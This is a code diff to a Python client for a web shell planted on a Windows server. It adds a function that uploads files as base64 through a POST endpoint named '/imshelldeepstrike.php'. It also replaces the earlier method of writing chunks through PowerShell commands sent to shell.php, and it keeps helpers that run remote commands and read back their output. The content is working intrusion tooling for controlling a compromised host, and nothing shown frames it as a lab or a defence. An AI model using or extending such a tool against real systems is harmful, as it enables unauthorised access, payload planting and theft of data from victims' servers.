@@ -82,6 +82,33 @@ def send_command(cmd: str) -> Tuple[str, Optional[int]]:
     return body, res.status_code
 
 
+def send_upload(file_data: bytes, remote_path: str) -> Tuple[str, Optional[int]]:
+    """
+    Upload a file directly via POST with r (base64 data) and n (full remote path) parameters.
+    This uses the /imshelldeepstrike.php upload endpoint which saves to the provided remote_path.
+    """
+    b64_data = base64.b64encode(file_data).decode("ascii")
+    url = build_url()
+    try:
+        if TIMEOUT is None:
+            res = requests.post(url, data={"r": b64_data, "n": remote_path})
+        else:
+            res = requests.post(url, data={"r": b64_data, "n": remote_path}, timeout=TIMEOUT)
+    except requests.exceptions.Timeout:
+        return "request timed out", None
+    except requests.exceptions.ConnectionError:
+        return "connection failed", None
+    except requests.RequestException as exc:
+        return f"request error: {exc}", None
+    body = res.text.strip()
+    if not res.ok:
+        prefix = f"http {res.status_code}"
+        if body:
+            return f"{prefix}: {body}", res.status_code
+        return prefix, res.status_code
+    return body, res.status_code
+
+
 def extract_pre(text: str) -> str:
     """
     Extract content inside the <pre>...</pre> that shell.php wraps around output.
@@ -136,8 +163,9 @@ def download_file(remote_path: str, local_path: str) -> int:
 
 def upload_file(local_path: str, remote_path: str) -> dict:
     """
-    Upload a local file to a **Windows** target by base64-encoding it locally
-    and having PowerShell decode it into a file on the remote side.
+    Upload a local file to a **Windows** target using the direct POST upload
+    method (r/n parameters) via /imshelldeepstrike.php.
+    The file is saved to the full remote_path provided by the user.
     """
     path = Path(local_path)
     if not path.is_file():
@@ -149,63 +177,24 @@ def upload_file(local_path: str, remote_path: str) -> dict:
     if total == 0:
         raise ValueError("cannot upload empty file")
 
-    remote_ps = ps_escape_single_quotes(remote_path)
-
-    # Send the file in chunks so we do not hit command-line length
-    # limits or HTTP/server size limits.
-    first = True
-    offset = 0
-    last_body: str = ""
-    last_status: Optional[int] = None
-    chunk_index = 0
-
-    # Compute number of chunks for logging.
-    num_chunks = (total + UPLOAD_CHUNK_SIZE - 1) // UPLOAD_CHUNK_SIZE
     print(
         f"[upload] starting '{local_path}' -> '{remote_path}' "
-        f"({total} bytes, chunk_size={UPLOAD_CHUNK_SIZE}, chunks={num_chunks})"
+        f"({total} bytes)"
     )
 
-    while offset < total:
-        chunk = data[offset : offset + UPLOAD_CHUNK_SIZE]
-        offset += len(chunk)
-        b64 = base64.b64encode(chunk).decode("ascii")
-        chunk_index += 1
+    # Send the file in a single POST request with r (base64 data) and n (full remote path)
+    upload_body, upload_status = send_upload(data, remote_path)
 
-        # Build PowerShell command using variables to keep the command line
-        # shorter and avoid quoting surprises.
-        if first:
-            # First chunk: create/overwrite the file
-            ps_cmd = (
-                f"$b='{b64}';"
-                f"[IO.File]::WriteAllBytes('{remote_ps}', "
-                "[Convert]::FromBase64String($b))"
-            )
-            first = False
-        else:
-            # Subsequent chunks: append to the existing file
-            ps_cmd = (
-                f"$p='{remote_ps}';"
-                f"$b='{b64}';"
-                "$d=[Convert]::FromBase64String($b);"
-                "$fs=[IO.File]::Open($p,[IO.FileMode]::Append);"
-                "$fs.Write($d,0,$d.Length);"
-                "$fs.Close()"
-            )
+    if upload_status is not None and upload_status != 200:
+        snippet = upload_body[:200] if upload_body else ""
+        raise RuntimeError(
+            f"upload failed with status={upload_status}: {snippet!r}"
+        )
 
-        cmd = "powershell -NoLogo -NonInteractive -Command " f"\"{ps_cmd}\""
-        last_body, last_status = send_command(cmd)
-        if last_status is not None and last_status != 200:
-            snippet = extract_pre(last_body)[:200]
-            raise RuntimeError(
-                f"upload chunk {chunk_index}/{num_chunks} failed "
-                f"with status={last_status}: {snippet!r}"
-            )
-
-        # Give some feedback for large uploads
-        print(f"[upload] sent chunk {chunk_index}/{num_chunks}, {len(chunk)} bytes")
+    print(f"[upload] sent file ({total} bytes)")
 
     # Verify remote size
+    remote_ps = ps_escape_single_quotes(remote_path)
     size_cmd = (
         "powershell -NoLogo -NonInteractive -Command "
         f"\"if (Test-Path '{remote_ps}') "
@@ -227,9 +216,9 @@ def upload_file(local_path: str, remote_path: str) -> dict:
 
     return {
         "total": total,
-        "chunks": num_chunks,
-        "last_body": last_body,
-        "last_status": last_status,
+        "chunks": 1,  # Single POST request now
+        "last_body": upload_body,
+        "last_status": upload_status,
         "remote_size_text": size_text,
         "remote_size_status": size_status,
         "remote_path": remote_path,
